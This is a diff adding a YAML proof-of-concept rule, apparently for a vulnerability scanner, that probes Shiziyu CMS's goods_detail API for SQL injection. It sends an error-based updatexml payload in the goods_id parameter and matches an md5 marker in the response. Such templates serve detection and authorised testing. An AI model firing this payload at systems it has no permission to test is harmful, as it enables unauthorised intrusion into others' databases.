@@ -1,0 +1,17 @@
+name: poc-yaml-shiziyu-cms-apicontroller-sqli
+manual: true
+transport: http
+set:
+    rand: randomInt(200000000, 210000000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{rand}}),0x7e),1)
+        expression: response.status == 404 && response.body.bcontains(bytes(substr(md5(string(rand)), 0, 31)))
+expression: r0()
+detail:
+    author: sakura404x
+    links:
+        - https://blog.csdn.net/weixin_42633229/article/details/117070546
